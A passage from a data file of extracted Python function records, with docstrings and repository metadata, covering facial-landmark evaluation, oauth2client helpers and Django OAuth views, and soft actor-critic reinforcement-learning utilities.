j])\n      pts_sum = pts_sum + 1\n  error_per_image[i] = dis_sum / (pts_sum*interocular_distance)\n\nnormalise_mean_error = error_per_image.mean()\n# calculate the auc for 0.07\nmax_threshold = 0.07\nthreshold = np.linspace(0, max_threshold, num=2000)\naccuracys = np.zeros(threshold.shape)\nfor i in range(threshold.size):\n  accuracys[i] = np.sum(error_per_image < threshold[i]) * 1.0 / error_per_image.size\narea_under_curve07 = auc(threshold, accuracys) / max_threshold\n# calculate the auc for 0.08\nmax_threshold = 0.08\nthreshold = np.linspace(0, max_threshold, num=2000)\naccuracys = np.zeros(threshold.shape)\nfor i in range(threshold.size):\n  accuracys[i] = np.sum(error_per_image < threshold[i]) * 1.0 / error_per_image.size\narea_under_curve08 = auc(threshold, accuracys) / max_threshold\n\naccuracy_under_007 = np.sum(error_per_image<0.07) * 100. / error_per_image.size\naccuracy_under_008 = np.sum(error_per_image<0.08) * 100. / error_per_image.size\n\nprint_log('Compute NME and AUC for {:} images with {:} points :: [(NME): mean={:.3f}, std={:.3f}], auc@0.07={:.3f}, auc@0.08-{:.3f}, acc@0.07={:.3f}, acc@0.08={:.3f}'.format(num_images, num_points, normalise_mean_error*100, error_per_image.std()*100, area_under_curve07*100, area_under_curve08*100, accuracy_under_007, accuracy_under_008), log)\n\nfor_pck_curve = []\nfor x in range(0, 3501, 1):\n  error_bar = x * 0.0001\n  accuracy = np.sum(error_per_image < error_bar) * 1.0 / error_per_image.size\n  for_pck_curve.append((error_bar, accuracy))\n\nreturn normalise_mean_error, accuracy_under_008, for_pck_curve", "path": "lib\\xvision\\common_eval.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "\"\"\"\nArgs:\n  pic (PIL.Image or numpy.ndarray): Image to be converted to tensor.\n  points 3 * N numpy.ndarray [x, y, visiable] or Point_Meta\nReturns:\n  Tensor: Converted image.\n\"\"\"\n## add to support list\n", "func_signal": "def __call__(self, pics, points):\n", "code": "if isinstance(pics, list): is_list = True\nelse:                      is_list, pics = False, [pics]\n\nreturned = []\nfor pic in pics:\n  if isinstance(pic, np.ndarray):\n    # handle numpy array\n    img = torch.from_numpy(pic.transpose((2, 0, 1)))\n    # backward compatibility\n    returned.append( img.float().div(255) )\n    continue\n\n  # handle PIL Image\n  if pic.mode == 'I':\n    img = torch.from_numpy(np.array(pic, np.int32, copy=False))\n  elif pic.mode == 'I;16':\n    img = torch.from_numpy(np.array(pic, np.int16, copy=False))\n  else:\n    img = torch.ByteTensor(torch.ByteStorage.from_buffer(pic.tobytes()))\n  # PIL image mode: 1, L, P, I, F, RGB, YCbCr, RGBA, CMYK\n  if pic.mode == 'YCbCr':\n    nchannel = 3\n  elif pic.mode == 'I;16':\n    nchannel = 1\n  else:\n    nchannel = len(pic.mode)\n  img = img.view(pic.size[1], pic.size[0], nchannel)\n  # put it from HWC to CHW format\n  # yikes, this transpose takes 80% of the loading time/CPU\n  img = img.transpose(0, 1).transpose(0, 2).contiguous()\n  if isinstance(img, torch.ByteTensor):\n    img = img.float().div(255)\n  returned.append(img)\n\nif is_list == False:\n  assert len(returned) == 1, 'For non-list data, length of answer must be one not {}'.format(len(returned))\n  returned = returned[0]\n\nreturn returned, points", "path": "lib\\xvision\\transforms.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "'''\nthis function return a tuple, which contains (directory, filename, extension)\nif the file has multiple extension, only last one will be displayed\n'''\n", "func_signal": "def fileparts(pathname):\n", "code": "pathname = osp.normpath(pathname)\nif len(pathname) == 0:\n  return ('', '', '')\nif pathname[-1] == '/':\n  if len(pathname) > 1:\n    return (pathname[:-1], '', '')  # ignore the final '/'\n  else:\n    return (pathname, '', '') # ignore the final '/'\ndirectory = osp.dirname(osp.abspath(pathname))\nfilename  = osp.splitext(osp.basename(pathname))[0]\next       = osp.splitext(pathname)[1]\nreturn (directory, filename, ext)", "path": "lib\\utils\\file_utils.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "## AugCrop has something wrong... For unsupervised data\n  \n", "func_signal": "def __call__(self, imgs, point_meta=None):\n", "code": "point_meta = point_meta.copy()\nif isinstance(imgs, list): is_list = True\nelse:                      is_list, imgs = False, [imgs]\n\ndice_x, dice_y = random.random(), random.random()\nx_offset = int( (dice_x-0.5) * 2 * self.center_perterb_max)\ny_offset = int( (dice_y-0.5) * 2 * self.center_perterb_max)\n\nx1 = int(round( point_meta.center[0] + x_offset - self.crop_x / 2. ))\ny1 = int(round( point_meta.center[1] + y_offset - self.crop_y / 2. ))\nx2 = x1 + self.crop_x\ny2 = y1 + self.crop_y\n\nw, h = imgs[0].size\nif x1 < 0 or y1 < 0 or x2 >= w or y2 >= h:\n  pad = max(0-x1, 0-y1, x2-w+1, y2-h+1)\n  assert pad > 0, 'padding operation in crop must be greater than 0'\n  imgs = [ ImageOps.expand(img, border=pad, fill=self.fill) for img in imgs ]\n  x1, x2, y1, y2 = x1 + pad, x2 + pad, y1 + pad, y2 + pad\n  point_meta.apply_offset(pad, pad)\n  point_meta.apply_bound(imgs[0].size[0], imgs[0].size[1])\n\npoint_meta.apply_offset(-x1, -y1)\nimgs = [ img.crop((x1, y1, x2, y2)) for img in imgs ]\npoint_meta.apply_bound(imgs[0].size[0], imgs[0].size[1])\n\nif is_list == False: imgs = imgs[0]\nreturn imgs, point_meta", "path": "lib\\xvision\\transforms.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "## AugCrop has something wrong... For unsupervised data\n\n", "func_signal": "def __call__(self, imgs, point_meta):\n", "code": "if isinstance(imgs, list): is_list = True\nelse:                      is_list, imgs = False, [imgs]\n\nw, h = imgs[0].size\nbox = point_meta.get_box().tolist()\nface_ex_w, face_ex_h = (box[2] - box[0]) * self.expand_ratio, (box[3] - box[1]) * self.expand_ratio\nx1, y1 = int(max(math.floor(box[0]-face_ex_w), 0)), int(max(math.floor(box[1]-face_ex_h), 0))\nx2, y2 = int(min(math.ceil(box[2]+face_ex_w), w)), int(min(math.ceil(box[3]+face_ex_h), h))\n\nimgs = [ img.crop((x1, y1, x2, y2)) for img in imgs ]\npoint_meta.set_precrop_wh( imgs[0].size[0], imgs[0].size[1], x1, y1, x2, y2)\npoint_meta.apply_offset(-x1, -y1)\npoint_meta.apply_bound(imgs[0].size[0], imgs[0].size[1])\n\nif is_list == False: imgs = imgs[0]\nreturn imgs, point_meta", "path": "lib\\xvision\\transforms.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "\"\"\"Create a summary writer logging to log_dir.\"\"\"\n", "func_signal": "def __init__(self, log_dir, logstr):\n", "code": "self.log_dir = Path(log_dir)\nself.model_dir = Path(log_dir) / 'checkpoint'\nself.meta_dir = Path(log_dir) / 'metas'\nself.log_dir.mkdir(mode=0o775, parents=True, exist_ok=True)\nself.model_dir.mkdir(mode=0o775, parents=True, exist_ok=True)\nself.meta_dir.mkdir(mode=0o775, parents=True, exist_ok=True)\n\nself.logger_path = self.log_dir / '{:}.log'.format(logstr)\nself.logger_file = open(self.logger_path, 'w')", "path": "lib\\log_utils\\logger.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "'''\nload data or string from text file.\n'''\n", "func_signal": "def load_txt_file(file_path):\n", "code": "with open(file_path, 'r') as cfile:\n  content = cfile.readlines()\ncfile.close()\ncontent = [x.strip() for x in content]\nnum_lines = len(content)\nreturn content, num_lines", "path": "lib\\utils\\file_utils.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "# maps  = np.ndarray with shape [height, width, channels]\n# order = 0 Nearest\n# order = 1 Bilinear\n# order = 2 Cubic\n", "func_signal": "def resize_heatmap(maps, height, width, order=3):\n", "code": "assert isinstance(maps, np.ndarray) and len(maps.shape) == 3, 'maps type : {}'.format(type(maps))\n\nscale = tuple(np.array([height,width], dtype=float) / np.array(maps.shape[:2]))\nreturn zoom(maps, scale + (1,), order=order)", "path": "lib\\datasets\\dataset_utils.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "'''\nload a list of files or folders from a system path\n\nparameter:\n  folder_path: root to search \n  ext_filter: a string to represent the extension of files interested\n  depth: maximum depth of folder to search, when it's None, all levels of folders will be searched\n'''\n", "func_signal": "def load_list_from_folder(folder_path, ext_filter=None, depth=1):\n", "code": "folder_path = osp.normpath(folder_path)\nassert isinstance(depth, int) , 'input depth is not correct {}'.format(depth)\nassert ext_filter is None or (isinstance(ext_filter, list) and all(isinstance(ext_tmp, str) for ext_tmp in ext_filter)) or isinstance(ext_filter, str), 'extension filter is not correct'\nif isinstance(ext_filter, str):    # convert to a list\n  ext_filter = [ext_filter]\n\nfulllist = list()\nwildcard_prefix = '*'\nfor index in range(depth):\n  if ext_filter is not None:\n    for ext_tmp in ext_filter:\n      curpath = osp.join(folder_path, wildcard_prefix + '.' + ext_tmp)\n      fulllist += glob.glob(curpath)\n  else:\n    curpath = osp.join(folder_path, wildcard_prefix)\n    fulllist += glob.glob(curpath)\n  wildcard_prefix = osp.join(wildcard_prefix, '*')\n\nfulllist = [osp.normpath(path_tmp) for path_tmp in fulllist]\nnum_elem = len(fulllist)\n\nreturn fulllist, num_elem", "path": "lib\\utils\\file_utils.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "\"\"\"Converts bytes to a string value, if necessary.\n\nArgs:\n    value: The string/bytes value to be converted.\n\nReturns:\n    The original value converted to unicode (if bytes) or as passed in\n    if it started out as unicode.\n\nRaises:\n    ValueError if the value could not be converted to unicode.\n\"\"\"\n", "func_signal": "def _from_bytes(value):\n", "code": "result = (value.decode('utf-8')\n          if isinstance(value, six.binary_type) else value)\nif isinstance(result, six.text_type):\n    return result\nelse:\n    raise ValueError(\n        '{0!r} could not be converted to unicode'.format(value))", "path": "oauth2client\\_helpers.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Converts a string value to bytes, if necessary.\n\nUnfortunately, ``six.b`` is insufficient for this task since in\nPython2 it does not modify ``unicode`` objects.\n\nArgs:\n    value: The string/bytes value to be converted.\n    encoding: The encoding to use to convert unicode to bytes. Defaults\n              to \"ascii\", which will not allow any characters from ordinals\n              larger than 127. Other useful values are \"latin-1\", which\n              which will only allows byte ordinals (up to 255) and \"utf-8\",\n              which will encode any unicode that needs to be.\n\nReturns:\n    The original value converted to bytes (if unicode) or as passed in\n    if it started out as bytes.\n\nRaises:\n    ValueError if the value could not be converted to bytes.\n\"\"\"\n", "func_signal": "def _to_bytes(value, encoding='ascii'):\n", "code": "result = (value.encode(encoding)\n          if isinstance(value, six.text_type) else value)\nif isinstance(result, six.binary_type):\n    return result\nelse:\n    raise ValueError('{0!r} could not be converted to bytes'.format(value))", "path": "oauth2client\\_helpers.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Overrides ``models.Field`` method. This is used to convert\nbytes (from serialization etc) to an instance of this class\"\"\"\n", "func_signal": "def to_python(self, value):\n", "code": "if value is None:\n    return None\nelif isinstance(value, oauth2client.client.Credentials):\n    return value\nelse:\n    try:\n        return jsonpickle.decode(\n            base64.b64decode(encoding.smart_bytes(value)).decode())\n    except ValueError:\n        return pickle.loads(\n            base64.b64decode(encoding.smart_bytes(value)))", "path": "oauth2client\\contrib\\django_util\\models.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Convert the field value from the provided model to a string.\n\nUsed during model serialization.\n\nArgs:\n    obj: db.Model, model object\n\nReturns:\n    string, the serialized field value\n\"\"\"\n", "func_signal": "def value_to_string(self, obj):\n", "code": "value = self._get_val_from_obj(obj)\nreturn self.get_prep_value(value)", "path": "oauth2client\\contrib\\django_util\\models.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Converts stringifed scope value to a list.\n\nIf scopes is a list then it is simply passed through. If scopes is an\nstring then a list of each individual scope is returned.\n\nArgs:\n    scopes: a string or iterable of strings, the scopes.\n\nReturns:\n    The scopes in a list.\n\"\"\"\n", "func_signal": "def string_to_scopes(scopes):\n", "code": "if not scopes:\n    return []\nelif isinstance(scopes, six.string_types):\n    return scopes.split(' ')\nelse:\n    return scopes", "path": "oauth2client\\_helpers.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Construct a Verified instance from a string.\n\nArgs:\n    key_pem: string, public key in PEM format.\n    is_x509_cert: bool, True if key_pem is an X509 cert, otherwise it\n                  is expected to be an RSA key in PEM format.\n\nReturns:\n    Verifier instance.\n\"\"\"\n", "func_signal": "def from_string(key_pem, is_x509_cert):\n", "code": "if is_x509_cert:\n    key_pem = _helpers._to_bytes(key_pem)\n    pemLines = key_pem.replace(b' ', b'').split()\n    certDer = _helpers._urlsafe_b64decode(b''.join(pemLines[1:-1]))\n    certSeq = DerSequence()\n    certSeq.decode(certDer)\n    tbsSeq = DerSequence()\n    tbsSeq.decode(certSeq[0])\n    pubkey = RSA.importKey(tbsSeq[6])\nelse:\n    pubkey = RSA.importKey(key_pem)\nreturn PyCryptoVerifier(pubkey)", "path": "oauth2client\\_pycrypto_crypt.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\" Looks up the flow in session to recover information about requested\nscopes.\n\nArgs:\n    csrf_token: The token passed in the callback request that should\n        match the one previously generated and stored in the request on the\n        initial authorization view.\n\nReturns:\n    The OAuth2 Flow object associated with this flow based on the\n    CSRF token.\n\"\"\"\n", "func_signal": "def _get_flow_for_token(csrf_token, request):\n", "code": "flow_pickle = request.session.get(_FLOW_KEY.format(csrf_token), None)\nreturn None if flow_pickle is None else jsonpickle.decode(flow_pickle)", "path": "oauth2client\\contrib\\django_util\\views.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Overrides ``models.Field`` method. This is used to convert\nthe value from an instances of this class to bytes that can be\ninserted into the database.\n\"\"\"\n", "func_signal": "def get_prep_value(self, value):\n", "code": "if value is None:\n    return None\nelse:\n    return encoding.smart_text(\n        base64.b64encode(jsonpickle.encode(value).encode()))", "path": "oauth2client\\contrib\\django_util\\models.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "# Guard against unicode strings, which base64 can't handle.\n", "func_signal": "def _urlsafe_b64decode(b64string):\n", "code": "b64string = _to_bytes(b64string)\npadded = b64string + b'=' * (4 - len(b64string) % 4)\nreturn base64.urlsafe_b64decode(padded)", "path": "oauth2client\\_helpers.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\" View to start the OAuth2 Authorization flow.\n\n This view starts the OAuth2 authorization flow. If scopes is passed in\n as a  GET URL parameter, it will authorize those scopes, otherwise the\n default scopes specified in settings. The return_url can also be\n specified as a GET parameter, otherwise the referer header will be\n checked, and if that isn't found it will return to the root path.\n\nArgs:\n   request: The Django request object.\n\nReturns:\n     A redirect to Google OAuth2 Authorization.\n\"\"\"\n", "func_signal": "def oauth2_authorize(request):\n", "code": "return_url = request.GET.get('return_url', None)\nif not return_url:\n    return_url = request.META.get('HTTP_REFERER', '/')\n\nscopes = request.GET.getlist('scopes', django_util.oauth2_settings.scopes)\n# Model storage (but not session storage) requires a logged in user\nif django_util.oauth2_settings.storage_model:\n    if not request.user.is_authenticated():\n        return redirect('{0}?next={1}'.format(\n            settings.LOGIN_URL, parse.quote(request.get_full_path())))\n    # This checks for the case where we ended up here because of a logged\n    # out user but we had credentials for it in the first place\n    else:\n        user_oauth = django_util.UserOAuth2(request, scopes, return_url)\n        if user_oauth.has_credentials():\n            return redirect(return_url)\n\nflow = _make_flow(request=request, scopes=scopes, return_url=return_url)\nauth_url = flow.step1_get_authorize_url()\nreturn shortcuts.redirect(auth_url)", "path": "oauth2client\\contrib\\django_util\\views.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\" View that handles the user's return from OAuth2 provider.\n\nThis view verifies the CSRF state and OAuth authorization code, and on\nsuccess stores the credentials obtained in the storage provider,\nand redirects to the return_url specified in the authorize view and\nstored in the session.\n\nArgs:\n    request: Django request.\n\nReturns:\n     A redirect response back to the return_url.\n\"\"\"\n", "func_signal": "def oauth2_callback(request):\n", "code": "if 'error' in request.GET:\n    reason = request.GET.get(\n        'error_description', request.GET.get('error', ''))\n    reason = html.escape(reason)\n    return http.HttpResponseBadRequest(\n        'Authorization failed {0}'.format(reason))\n\ntry:\n    encoded_state = request.GET['state']\n    code = request.GET['code']\nexcept KeyError:\n    return http.HttpResponseBadRequest(\n        'Request missing state or authorization code')\n\ntry:\n    server_csrf = request.session[_CSRF_KEY]\nexcept KeyError:\n    return http.HttpResponseBadRequest(\n        'No existing session for this flow.')\n\ntry:\n    state = json.loads(encoded_state)\n    client_csrf = state['csrf_token']\n    return_url = state['return_url']\nexcept (ValueError, KeyError):\n    return http.HttpResponseBadRequest('Invalid state parameter.')\n\nif client_csrf != server_csrf:\n    return http.HttpResponseBadRequest('Invalid CSRF token.')\n\nflow = _get_flow_for_token(client_csrf, request)\n\nif not flow:\n    return http.HttpResponseBadRequest('Missing Oauth2 flow.')\n\ntry:\n    credentials = flow.step2_exchange(code)\nexcept client.FlowExchangeError as exchange_error:\n    return http.HttpResponseBadRequest(\n        'An error has occurred: {0}'.format(exchange_error))\n\nget_storage(request).put(credentials)\n\nsignals.oauth2_authorized.send(sender=signals.oauth2_authorized,\n                               request=request, credentials=credentials)\n\nreturn shortcuts.redirect(return_url)", "path": "oauth2client\\contrib\\django_util\\views.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"A decorator to declare that only the first N arguments my be positional.\n\nThis decorator makes it easy to support Python 3 style keyword-only\nparameters. For example, in Python 3 it is possible to write::\n\n    def fn(pos1, *, kwonly1=None, kwonly1=None):\n        ...\n\nAll named parameters after ``*`` must be a keyword::\n\n    fn(10, 'kw1', 'kw2')  # Raises exception.\n    fn(10, kwonly1='kw1')  # Ok.\n\nExample\n^^^^^^^\n\nTo define a function like above, do::\n\n    @positional(1)\n    def fn(pos1, kwonly1=None, kwonly2=None):\n        ...\n\nIf no default value is provided to a keyword argument, it becomes a\nrequired keyword argument::\n\n    @positional(0)\n    def fn(required_kw):\n        ...\n\nThis must be called with the keyword parameter::\n\n    fn()  # Raises exception.\n    fn(10)  # Raises exception.\n    fn(required_kw=10)  # Ok.\n\nWhen defining instance or class methods always remember to account for\n``self`` and ``cls``::\n\n    class MyClass(object):\n\n        @positional(2)\n        def my_method(self, pos1, kwonly1=None):\n            ...\n\n        @classmethod\n        @positional(2)\n        def my_method(cls, pos1, kwonly1=None):\n            ...\n\nThe positional decorator behavior is controlled by\n``_helpers.positional_parameters_enforcement``, which may be set to\n``POSITIONAL_EXCEPTION``, ``POSITIONAL_WARNING`` or\n``POSITIONAL_IGNORE`` to raise an exception, log a warning, or do\nnothing, respectively, if a declaration is violated.\n\nArgs:\n    max_positional_arguments: Maximum number of positional arguments. All\n                              parameters after the this index must be\n                              keyword only.\n\nReturns:\n    A decorator that prevents using arguments after max_positional_args\n    from being used as positional parameters.\n\nRaises:\n    TypeError: if a key-word only argument is provided as a positional\n               parameter, but only if\n               _helpers.positional_parameters_enforcement is set to\n               POSITIONAL_EXCEPTION.\n\"\"\"\n\n", "func_signal": "def positional(max_positional_args):\n", "code": "def positional_decorator(wrapped):\n    @functools.wraps(wrapped)\n    def positional_wrapper(*args, **kwargs):\n        if len(args) > max_positional_args:\n            plural_s = ''\n            if max_positional_args != 1:\n                plural_s = 's'\n            message = ('{function}() takes at most {args_max} positional '\n                       'argument{plural} ({args_given} given)'.format(\n                           function=wrapped.__name__,\n                           args_max=max_positional_args,\n                           args_given=len(args),\n                           plural=plural_s))\n            if positional_parameters_enforcement == POSITIONAL_EXCEPTION:\n                raise TypeError(message)\n            elif positional_parameters_enforcement == POSITIONAL_WARNING:\n                logger.warning(message)\n        return wrapped(*args, **kwargs)\n    return positional_wrapper\n\nif isinstance(max_positional_args, six.integer_types):\n    return positional_decorator\nelse:\n    args, _, _, defaults = inspect.getargspec(max_positional_args)\n    return positional(len(args) - len(defaults))(max_positional_args)", "path": "oauth2client\\_helpers.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "# Use only a single key since dictionary hash order\n# is non-deterministic.\n", "func_signal": "def test_dictionary_input(self):\n", "code": "data = {u'foo': 10}\nresult = _helpers._json_encode(data)\nself.assertEqual(result, '{\"foo\":10}')", "path": "tests\\test__helpers.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Creates a Web Server Flow\n\nArgs:\n    request: A Django request object.\n    scopes: the request oauth2 scopes.\n    return_url: The URL to return to after the flow is complete. Defaults\n        to the path of the current request.\n\nReturns:\n    An OAuth2 flow object that has been stored in the session.\n\"\"\"\n# Generate a CSRF token to prevent malicious requests.\n", "func_signal": "def _make_flow(request, scopes, return_url=None):\n", "code": "csrf_token = hashlib.sha256(os.urandom(1024)).hexdigest()\n\nrequest.session[_CSRF_KEY] = csrf_token\n\nstate = json.dumps({\n    'csrf_token': csrf_token,\n    'return_url': return_url,\n})\n\nflow = client.OAuth2WebServerFlow(\n    client_id=django_util.oauth2_settings.client_id,\n    client_secret=django_util.oauth2_settings.client_secret,\n    scope=scopes,\n    state=state,\n    redirect_uri=request.build_absolute_uri(\n        urlresolvers.reverse(\"google_oauth:callback\")))\n\nflow_key = _FLOW_KEY.format(csrf_token)\nrequest.session[flow_key] = jsonpickle.encode(flow)\nreturn flow", "path": "oauth2client\\contrib\\django_util\\views.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Parses unique key-value parameters from urlencoded content.\n\nArgs:\n    content: string, URL-encoded key-value pairs.\n\nReturns:\n    dict, The key-value pairs from ``content``.\n\nRaises:\n    ValueError: if one of the keys is repeated.\n\"\"\"\n", "func_signal": "def parse_unique_urlencoded(content):\n", "code": "urlencoded_params = urllib.parse.parse_qs(content)\nparams = {}\nfor key, value in six.iteritems(urlencoded_params):\n    if len(value) != 1:\n        msg = ('URL-encoded content contains a repeated value:'\n               '%s -> %s' % (key, ', '.join(value)))\n        raise ValueError(msg)\n    params[key] = value[0]\nreturn params", "path": "oauth2client\\_helpers.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Adds a query parameter to a url.\n\nReplaces the current value if it already exists in the URL.\n\nArgs:\n    url: string, url to add the query parameter to.\n    name: string, query parameter name.\n    value: string, query parameter value.\n\nReturns:\n    Updated query parameter. Does not update the url if value is None.\n\"\"\"\n", "func_signal": "def _add_query_parameter(url, name, value):\n", "code": "if value is None:\n    return url\nelse:\n    return update_query_params(url, {name: value})", "path": "oauth2client\\_helpers.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Converts scope value to a string.\n\nIf scopes is a string then it is simply passed through. If scopes is an\niterable then a string is returned that is all the individual scopes\nconcatenated with spaces.\n\nArgs:\n    scopes: string or iterable of strings, the scopes.\n\nReturns:\n    The scopes formatted as a single string.\n\"\"\"\n", "func_signal": "def scopes_to_string(scopes):\n", "code": "if isinstance(scopes, six.string_types):\n    return scopes\nelse:\n    return ' '.join(scopes)", "path": "oauth2client\\_helpers.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Updates a URI with new query parameters.\n\nIf a given key from ``params`` is repeated in the ``uri``, then\nthe URI will be considered invalid and an error will occur.\n\nIf the URI is valid, then each value from ``params`` will\nreplace the corresponding value in the query parameters (if\nit exists).\n\nArgs:\n    uri: string, A valid URI, with potential existing query parameters.\n    params: dict, A dictionary of query parameters.\n\nReturns:\n    The same URI but with the new query parameters added.\n\"\"\"\n", "func_signal": "def update_query_params(uri, params):\n", "code": "parts = urllib.parse.urlparse(uri)\nquery_params = parse_unique_urlencoded(parts.query)\nquery_params.update(params)\nnew_query = urllib.parse.urlencode(query_params)\nnew_parts = parts._replace(query=new_query)\nreturn urllib.parse.urlunparse(new_parts)", "path": "oauth2client\\_helpers.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Signs a message.\n\nArgs:\n    message: string, Message to be signed.\n\nReturns:\n    string, The signature of the message for the given key.\n\"\"\"\n", "func_signal": "def sign(self, message):\n", "code": "message = _helpers._to_bytes(message, encoding='utf-8')\nreturn PKCS1_v1_5.new(self._key).sign(SHA256.new(message))", "path": "oauth2client\\_pycrypto_crypt.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"Verifies a message against a signature.\n\nArgs:\n    message: string or bytes, The message to verify. If string, will be\n             encoded to bytes as utf-8.\n    signature: string or bytes, The signature on the message.\n\nReturns:\n    True if message was signed by the private key associated with the\n    public key that this object was constructed with.\n\"\"\"\n", "func_signal": "def verify(self, message, signature):\n", "code": "message = _helpers._to_bytes(message, encoding='utf-8')\nreturn PKCS1_v1_5.new(self._pubkey).verify(\n    SHA256.new(message), signature)", "path": "oauth2client\\_pycrypto_crypt.py", "repo_name": "googleapis/oauth2client", "stars": 796, "license": "apache-2.0", "language": "python", "size": 23980}
{"docstring": "\"\"\"\nAdd a path to the replay buffer.\n\nThis default implementation naively goes through every step, but you\nmay want to optimize this.\n\nNOTE: You should NOT call \"terminate_episode\" after calling add_path.\nIt's assumed that this function handles the episode termination.\n\n:param path: Dict like one outputted by railrl.samplers.util.rollout\n\"\"\"\n", "func_signal": "def add_path(self, path):\n", "code": "for i, (\n        obs,\n        action,\n        reward,\n        next_obs,\n        terminal,\n        agent_info,\n        env_info\n) in enumerate(zip(\n    path[\"observations\"],\n    path[\"actions\"],\n    path[\"rewards\"],\n    path[\"next_observations\"],\n    path[\"terminals\"],\n    path[\"agent_infos\"],\n    path[\"env_infos\"],\n)):\n    self.add_sample(\n        obs,\n        action,\n        reward,\n        terminal,\n        next_obs,\n        agent_info=agent_info,\n        env_info=env_info,\n    )\nself.terminate_episode()", "path": "sac\\replay_buffers\\replay_buffer.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"TODO: Implement for dimensions >1\"\"\"\n", "func_signal": "def checkerboard(shape, parity='even', dtype=tf.bool):\n", "code": "if len(shape) > 1:\n    raise NotImplementedError(\n        \"checkerboard not yet implemented for dimensions >1\")\n\nunit = (tf.constant((True, False))\n        if parity == 'even' else tf.constant((False, True)))\n\nnum_elements = np.prod(shape)\ntiled = tf.tile(unit, ((num_elements // 2) + 1, ))[:num_elements]\nreturn tf.cast(tf.reshape(tiled, shape), dtype)", "path": "sac\\distributions\\real_nvp_bijector.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"Sample single action based on the observations.\n\"\"\"\n\n", "func_signal": "def get_action(self, observation):\n", "code": "if self._is_deterministic and self._n_map_action_candidates > 1:\n    observations = np.tile(\n        observation[None], reps=(self._n_map_action_candidates, 1))\n    action_candidates = self.get_actions(observations)\n    q_values = self._q_function.eval(observations, action_candidates)\n    best_action_index = np.argmax(q_values)\n\n    return action_candidates[best_action_index], {}\nreturn self.get_actions(observation[None])[0], {}", "path": "sac\\policies\\latent_space_policy.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"Perform evaluation for the current policy.\n\n:param epoch: The epoch number.\n:return: None\n\"\"\"\n\n", "func_signal": "def _evaluate(self, epoch):\n", "code": "if self._eval_n_episodes < 1:\n    return\n\nwith self._policy.deterministic(self._eval_deterministic):\n    paths = rollouts(self._eval_env, self._policy,\n                     self.sampler._max_path_length, self._eval_n_episodes,\n                    )\n\ntotal_returns = [path['rewards'].sum() for path in paths]\nepisode_lengths = [len(p['rewards']) for p in paths]\n\nlogger.record_tabular('return-average', np.mean(total_returns))\nlogger.record_tabular('return-min', np.min(total_returns))\nlogger.record_tabular('return-max', np.max(total_returns))\nlogger.record_tabular('return-std', np.std(total_returns))\nlogger.record_tabular('episode-length-avg', np.mean(episode_lengths))\nlogger.record_tabular('episode-length-min', np.min(episode_lengths))\nlogger.record_tabular('episode-length-max', np.max(episode_lengths))\nlogger.record_tabular('episode-length-std', np.std(episode_lengths))\n\nself._eval_env.log_diagnostics(paths)\nif self._eval_render:\n    self._eval_env.render(paths)\n\niteration = epoch*self._epoch_length\nbatch = self.sampler.random_batch()\nself.log_diagnostics(iteration, batch)", "path": "sac\\algos\\base.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
